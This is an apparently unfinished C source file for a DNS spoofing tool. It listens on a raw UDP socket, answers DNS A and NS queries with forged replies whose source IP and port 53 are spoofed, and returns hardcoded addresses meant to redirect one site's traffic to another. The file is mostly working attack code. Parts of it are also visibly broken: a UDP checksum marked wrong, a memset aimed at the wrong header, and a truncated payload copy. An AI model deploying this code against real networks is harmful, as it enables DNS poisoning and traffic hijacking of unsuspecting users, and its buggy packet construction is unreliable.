
/******************** DNS SPOOFING **********************




/********************************************************/


//socklib
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <errno.h>
#include  <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>		
#include <sys/types.h>
#include <arpa/inet.h>		
#include <sys/stat.h>
#include <unistd.h>
#include <linux/ip.h>
#include <netinet/udp.h>
#include <inttypes.h>
#include "dns.h"
#include "colordefs.h"

int main(int agrc, char *argv[]) {

	int sock = 0, csock = 0, packet_size = 0;
	struct sockaddr_in clientaddr;
	struct dns_header *header = NULL;
	struct dns_question_section *query_info = NULL;
	char *dns_packet = NULL;
	char *question_domain = NULL;
	char *message = NULL;
	char *fqdn = NULL;
	char *server_ip = NULL;

	memset((void *) &clientaddr,0,sizeof(struct sockaddr_in));


	if((sock = create_socket("mani",2222,SOCK_RAW)) == -1){
		printf("Failed to create UDP socket for DNS server\n");
		//if(server_ip) free(server_ip);
		return EXIT_FAILURE;
	}
	//if(server_ip) free(server_ip);
	int count = 0;
	/* DNS server receive loop */
	while(1){

		//if (count++ > 15) exit(0);
		//Free memory, if allocated */
		//if(dns_packet != NULL) free(dns_packet);
		dns_packet = NULL;

		/* Read in DNS requests */
		if((dns_packet = receive(sock,SOCK_RAW,&packet_size,csock,&clientaddr)) == NULL){
			printf("Failed to receive DNS request from client\n");
			return EXIT_FAILURE;
		}

		printf("Packet size is %d\n",  packet_size);
		/* Process DNS request packets */
		if(packet_size <= (int) (sizeof(struct dns_header) + sizeof(struct dns_question_section))){
			printf("Received invalid DNS packet; packet size too small");
			continue;
		}
		if (packet_size <= (int) (sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header)+ sizeof(struct dns_question_section))) {
			continue;
		}
		//used for IP/UDP header for respond
		char *dns_packet_cpy = dns_packet;

		dns_packet += sizeof(struct iphdr);
		dns_packet += sizeof(struct udphdr);
		
		header = (struct dns_header *) dns_packet;

		
		/* Only process DNS queries that have one question section */
		if(ntohs(header->num_questions) != MAX_DNS_QUESTIONS){
			printf("DNS packet contained the wrong number of questions %d\n",ntohs(header->num_questions));
			continue;
		}

		printf("------------ DNS QUERY -----------------");
    	printf("\n [%d QUS]",ntohs(header->num_questions));
    	printf(" [%d ANW]",ntohs(header->num_answers));
    	printf(" [%d AUT]",ntohs(header->num_authority));
    	printf(" [%d ADD]\n\n",ntohs(header->num_additional));
		
		//here

		/* Extract the domain name in a standard string format */
		question_domain = get_domain_in_question(dns_packet,packet_size);
		printf(_BBLUE_"Domain Name is %s"_NORMAL_"\n", question_domain);

		/* Make sure we got a valid domain query string */
		if(question_domain != NULL && strlen(question_domain) > 0){

			
			/* Check to make sure this is a type A or type NS, class IN DNS query */
			query_info = (struct dns_question_section *) ((dns_packet) + sizeof(struct dns_header) + strlen(question_domain) + 1);
			if((query_info->class == htons(DNS_CLASS_IN)) && ((query_info->type == htons(DNS_TYPE_A)) || (query_info->type == htons(DNS_TYPE_NS)))){

					printf(_YELLOW_"DNS CLASS IN , TYPE A | NS"_NORMAL_"\n");
					/* Send DNS reply packet to client */
					if(!send_dns_reply(question_domain,sock,&clientaddr,query_info->type,dns_packet,packet_size,dns_packet_cpy)){
						printf("Failed to send DNS response packet\n");
					}

			} else {
				printf(_BRED_"Received unsupported DNS query type or class. Only type A, NS and class IN queries are supported."_NORMAL_"\n");
			}	
		}
	}
	return 0;
}

/* Create DNS reply packet and send it to the client */
int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size, char *cpy)
{
	char *reply_packet = NULL, *fqdn = NULL;
	struct dns_header *header = NULL;
	struct dns_answer_section answer;
	int reply_packet_size = 0;
	int answer_size = sizeof(struct dns_answer_section);
	int bytes_sent = 0;
	int memcpy_offset = 0;
	in_addr_t ip_address1 = {0};
	in_addr_t ip_address2 = {0};

	/* Zero out the answer section structure */
	memset(&answer,0,sizeof(struct dns_answer_section));

	//fqdn = config_get_fqdn();
	//MASKARi
	//fqdn = "www.facebook.com";
	//BBC IP 212.58.251.195

	/* Check to make sure the packet size is of a valid length */
	if(request_packet_size > ((int) (sizeof(struct dns_header) + sizeof(struct dns_question_section)) + (int) strlen(question_domain))){

		 //maskari TODO
		 ip_address2 = inet_addr("212.58.251.195");//bbc
		 ip_address1 = inet_addr("74.125.226.212");//google

		/* Create the DNS answer section */
		answer.name = htons(DNS_REPLY_NAME);
		answer.type = dns_type;
		answer.class = htons(DNS_CLASS_IN);
		answer.ttl = htons(DNS_REPLY_TTL);

		if(dns_type == htons(DNS_TYPE_A)){

			/* Data is an IPv4 address */
			answer.data_len = htons(IPV4_ADDR_LEN);

			/* DNS response packet consists of the original DNS query plus the answer section,
			 * plus the answer data (an IPv4 address). We have two IP addresses, so there are
			 * two answer sections.
			 */
			reply_packet_size = request_packet_size + ((answer_size + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
			if((reply_packet = malloc(reply_packet_size)) != NULL){

				/* Memcpy packet data into the reply packet */
				memcpy(reply_packet,request_packet,request_packet_size);
				memcpy_offset += request_packet_size;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
				memcpy_offset += IPV4_ADDR_LEN;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);

			} else {
				perror("Malloc Failure");
				return 0;
			}

		} else if(dns_type == htons(DNS_TYPE_NS)){

			answer.data_len = htons(NS_NAME_LEN);

			reply_packet_size = request_packet_size + ((answer_size + NS_NAME_LEN) * DNS_NUM_ANSWERS);
			if((reply_packet = malloc(reply_packet_size)) != NULL){

				/* Memcpy packet data into the reply packet */
				memcpy(reply_packet,request_packet,request_packet_size);
				memcpy_offset += request_packet_size;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,NS_NAME_ONE,NS_NAME_LEN);
				memcpy_offset += NS_NAME_LEN;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,NS_NAME_TWO,NS_NAME_LEN);

			} else {
				perror("Malloc Failure");
				return 0;
			}
		}

		/* Change the number of answers and the flags values of the DNS packet header */
        header = (struct dns_header *) reply_packet;
        header->num_answers = htons(DNS_NUM_ANSWERS);
        header->flags = htons(DNS_REPLY_FLAGS);
		
		printf(_BGREEN_"FINAL STEP : Ready to send ..."_NORMAL_"\n");

		printf("\t1.making IP header ... \n");
		
		//received IP header
		struct iphdr *her_ip_hdr;
		her_ip_hdr = (struct iphdr *)malloc(sizeof(struct iphdr));
		decapsulate_fromip(cpy, &her_ip_hdr);
		print_ipheader(her_ip_hdr);

		//new IP header
		struct iphdr *ma_ip_hdr;
		ma_ip_hdr = (struct iphdr *)malloc(sizeof(struct iphdr));
		memset(ma_ip_hdr,0,sizeof(struct iphdr));
		int packetsize = sizeof(struct iphdr) + sizeof(struct udphdr) + reply_packet_size;
		printf("TOTAL PACKET SIZE = %d\n", packetsize);

		ma_ip_hdr->version = her_ip_hdr->version;
		ma_ip_hdr->ihl = her_ip_hdr->ihl;
		ma_ip_hdr->tot_len = htons(packetsize);
		ma_ip_hdr->ttl = her_ip_hdr->ttl;//??
		ma_ip_hdr->protocol = her_ip_hdr->protocol;
		//NOTE : swapping addresses
		ma_ip_hdr->saddr = her_ip_hdr->daddr;
		ma_ip_hdr->daddr = her_ip_hdr->saddr;

		//her UDP header
		struct udphdr *her_udp = malloc(sizeof(struct udphdr));
		cpy += sizeof(struct iphdr);
		char *p = cpy;
		memcpy(&(her_udp->source), p, sizeof(uint16_t));
		p= p + sizeof(uint8_t)*2;
		memcpy(&(her_udp->dest), p, sizeof(uint16_t));
		p= p + sizeof(uint8_t)*2;
		memcpy(&(her_udp->len), p, sizeof(uint16_t));
		p= p + sizeof(uint8_t)*2;
		memcpy(&(her_udp->check), p, sizeof(uint16_t));
		
		print_udpheader(her_udp,1);

		//ma UDP header
		struct udphdr *ma_udp = malloc(sizeof(struct udphdr));
		memset(ma_ip_hdr,0,sizeof(struct iphdr));
		int udpsize = sizeof(struct udphdr) + reply_packet_size;
		printf("UDP+DATA PACKET SIZE = %d\n", udpsize);
	
		ma_udp->source = htons(53); //spoofed
		ma_udp->dest =  htons(her_udp->dest);
		ma_udp->len = htons(udpsize);
		ma_udp->check = htons(her_udp->check); //wrong TODO
		print_udpheader(her_udp,2);



		/************* Malloc the actual packet here ***************/
		char *pkt = malloc(packetsize);
		/* 1. put ipheader */
		memcpy(pkt,ma_ip_hdr,sizeof(struct iphdr));
		/* 2. UDP header */
		printf("\t2.adding UPD header ... \n");
		char *udphdr_part = pkt + sizeof(struct iphdr);
		memcpy(udphdr_part, ma_udp, sizeof(struct udphdr));
		/* 3. DNS stuff */
		printf("\t3.adding dns payload ... \n");
		char *payload = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
		memcpy(payload , reply_packet, sizeof(struct udphdr));

		/*************** Checksum Time *******************************/
		int checksum = ip_sum(pkt, sizeof(struct iphdr));
		printf("\t4.Calculating checksum = %x\n", checksum);
		char *check = pkt + sizeof(uint8_t)*4 + sizeof(uint16_t)*3;
		memcpy(check,&checksum,sizeof(uint16_t));


		/*************** SEND SPOOFED PACKET : DONE ********************/

		bytes_sent = sendto(sock,pkt,packetsize,
				0,(struct sockaddr *) clientaddr, sizeof(struct sockaddr_in));

		if(bytes_sent != packetsize){
			printf("Failed to send response DNS packet\n");
		} else {
			printf(_GREEN_"******************DONEEEEEEEEEEEEEEEEEEEEE************"_NORMAL_"\n");
			exit(0);
			return 1;
		}


		/************************** TODO **********************************************
		* UDO checksum 
		SENDING TIME : 
			TODO : I am not using the command line argument for now.
			TEMPORARILY : we want to redirect all traffics to www.google.com --> www.bbc.co.uk
				IN DNS PACKET : alias
				ip_address2 = inet_addr("212.58.251.195");//bbc
		 		ip_address1 = inet_addr("74.125.226.212");//google
		/********************************************************************************/
		
		
		

	} else {
		printf("Failed to send DNS reply; DNS request packet appears to have an invalid length.\n");
	}

	return 0;
}

int ip_sum(char* packet, int n) {

  uint16_t *p = (uint16_t*)packet;
  uint16_t answer;
  long sum = 0;
  uint16_t odd_byte = 0;

  while (n > 1) {
    sum += *p++;
    n -= 2;
  }

  /* mop up an odd byte, if necessary */
  if (n == 1) {
    *(uint8_t*)(&odd_byte) = *(uint8_t*)p;
    sum += odd_byte;
  }

  sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
  sum += (sum >> 16);           /* add carry */
  answer = ~sum;                /* ones-complement, truncate*/
  return answer;
}

void print_udpheader(struct udphdr *udp, int way) {

	if (way == 1) {
		printf(_BCYAN_"\n-------------- Receiving UDP Header -------------"_NORMAL_"\n");
	} else {
		printf(_BCYAN_"\n-------------- Sending UDP Header -------------"_NORMAL_"\n");
	}
	printf("UDP src_port=%d dst_port=%d length=%d checksum=%x\n\n",
				ntohs(udp->source),
				ntohs(udp->dest),
				ntohs(udp->len),
				ntohs(udp->check));
}
/* Used to construct the IP header she sent us */
uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {

	char *p = packet;
	struct iphdr *i = *ipheader;
	//uint16_t newchecksum;
	memcpy(i, p, sizeof(uint8_t));
	p=p+sizeof(uint8_t)*2;
	memcpy(&(i->tot_len), p, sizeof(uint16_t));
	i->tot_len = ntohs(i->tot_len);
	p=p+sizeof(uint16_t);

	memcpy(&(i->id), p, sizeof(uint16_t));
	p=p+sizeof(uint16_t);
	memcpy(&(i->frag_off),p, sizeof(uint16_t));
	p=p+sizeof(uint16_t)+sizeof(uint8_t);

	memcpy(&(i->protocol), p, sizeof(uint8_t));
	p=p+sizeof(uint8_t); 

	memcpy(&(i->check), p, sizeof(uint16_t));
	memset(p,0,sizeof(uint16_t));

	p=p+sizeof(uint16_t);
	memcpy(&(i->saddr), p, sizeof(uint32_t));
	p=p+sizeof(uint32_t);
	memcpy(&(i->daddr), p, sizeof(uint32_t));

	char src[INET_ADDRSTRLEN];
	char dest[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, ((struct in_addr *)&(i->saddr)), src, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, ((struct in_addr *)&(i->daddr)), dest, INET_ADDRSTRLEN);

	return i->daddr;
}

/* Extract the domain name from the DNS query packet */
char *get_domain_in_question(char *dns_packet, int packet_size)
{
	char *domain_name_pointer = NULL;
	char *domain_name = NULL;
	char *tmp_ptr = NULL;
	int dns_header_len = sizeof(struct dns_header);
	int name_part_len = 0;
	int dn_len = 0;

	if(packet_size > dns_header_len){

		//printf("packet size= %d\n", packet_size);

		domain_name_pointer = (dns_packet + dns_header_len);
		
		do {
			/* Get the length of the next part of the domain name */
			name_part_len = (int) domain_name_pointer[0];

			//printf("name_part_len=%d\n",name_part_len);

			/* If the length is zero or invalid, then stop processing the domain name */
			if((name_part_len <= 0) || (name_part_len > (packet_size-dns_header_len))){
				printf("Ignoring : invalid name_part_len \n");
				break;
			}
			domain_name_pointer++;

			/* Reallocate domain_name pointer to name_part_len plus two bytes;
			 * one byte for the period, and one more for the trailing NULL byte.
			 */
			tmp_ptr = domain_name;
			domain_name = realloc(domain_name,(dn_len+name_part_len+PERIOD_SIZE+1));
			if(domain_name == NULL){
				if(tmp_ptr) free(tmp_ptr);
				perror("Realloc Failure");
				return NULL;
			}
			
			//printf("Domain name successfully reallocated\n");

			memset(domain_name+dn_len,0,name_part_len+PERIOD_SIZE+1);

			/* Concatenate this part of the domain name, plus the period */
			strncat(domain_name,domain_name_pointer,name_part_len);
			strncat(domain_name,PERIOD,PERIOD_SIZE);

			/* Keep track of how big domain_name is, and point 
			 * domain_name_pointer to the next part of the domain name.
			 */
			dn_len += name_part_len + PERIOD_SIZE + 1;
			domain_name_pointer += name_part_len;
		} while(name_part_len > 0);
	}

	return domain_name;
}

/* Create a server socket */
int create_socket(char *ip, int port, int sock_type)
{
	int on = 1;
	int sock = 0;
	int proto = 0;
	int addrlen = sizeof(struct sockaddr_in);
	struct sockaddr_in serveraddr;

	memset((void *) &serveraddr,0,sizeof(struct sockaddr_in));

	/* Use the right protocol type, if known */
	if(sock_type == SOCK_STREAM){
		proto = IPPROTO_TCP;
	} else if(sock_type == SOCK_DGRAM){
		proto = IPPROTO_UDP;
	} else if(sock_type == SOCK_RAW) {
		proto = IPPROTO_UDP;
	}
	//int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if((sock = socket(AF_INET,sock_type,proto)) < 0){
            printf("Socklib: Failed to create socket\n");
            return -1;
    }

     /* Set this to make sure we don't have problems re-binding the port if the application is
	 * shut down and then re-started in quick succession. 
	 */
    if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
        printf("Socklib: Failed to set socket option SO_REUSEADDR\n");
		//close_socket(sock);
        return -1;
    }

	return sock;
}

/* Listen for and receive data from a client connection. */
char *receive(int lsock, int sock_type, int *rx_bytes, int csock, struct sockaddr_in *clientaddr)
{
	int recv_size = 0;
	int clen = 0, header_offset = 0;
	int addrlen = sizeof(struct sockaddr_in);
	char *buffer = NULL, *tmp_ptr = NULL, *data_ptr = NULL;
	char *clen_ptr = NULL, *line_end_ptr = NULL;

	*rx_bytes = 0;
	
	if(sock_type == SOCK_DGRAM || sock_type == SOCK_RAW) {
		//bytes_recvd = recvfrom(fd, buffer, 65535, 0,  &src, &srclen);
		/* Malloc space for the buffer */
		if((buffer = malloc(UDP_RECV_SIZE+1)) == NULL){
                	perror("Malloc failed");
                	return NULL;
        	}
        	memset(buffer,0,UDP_RECV_SIZE+1);

		/* Read in UDP data. We only receive up to UDP_RECV_SIZE, which is sufficient for DNS requests. */
		if((*rx_bytes = recvfrom(lsock,buffer,UDP_RECV_SIZE,0,(struct sockaddr *) clientaddr, (socklen_t *) &addrlen)) < 0){
			printf("Socklib: Failed to read data from UDP socket\n");
			if(buffer) free(buffer);
			return NULL;
		}
		
	}
	
	/* Return received data */
	return buffer;
}

void print_ipheader(struct iphdr *i) {

	char src[INET_ADDRSTRLEN];
	char dest[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, ((struct in_addr *)&(i->saddr)), src, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, ((struct in_addr *)&(i->daddr)), dest, INET_ADDRSTRLEN);
	printf("vsion:%hd\t hlen:%hd\t len:%d\t id: %d\t foff %d\t ptcl: %hd\t sum: %x\t source: %s\t destination: %s\n",i->version,i->ihl,i->tot_len,i->id,i->frag_off,i->protocol,i->check,src,dest);
		
}
